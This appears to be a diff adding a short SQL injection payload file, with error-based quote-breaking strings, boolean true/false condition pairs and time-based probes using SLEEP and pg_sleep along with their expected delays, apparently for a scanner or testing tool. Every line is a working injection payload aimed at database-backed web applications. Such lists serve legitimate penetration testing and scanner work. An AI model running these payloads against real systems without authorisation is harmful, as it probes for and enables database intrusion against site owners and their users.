@@ -1,0 +1,8 @@
+# SQL injection payload repository
+error|'"
+error|') OR ('1'='1
+error|" ) OR ("1"="1
+boolean|' AND '1'='1'--|' AND '1'='2'--
+boolean|" AND "1"="1"--|" AND "1"="2"--
+time|' AND SLEEP(8)--|8s
+time|'||(SELECT pg_sleep(7))--|7s
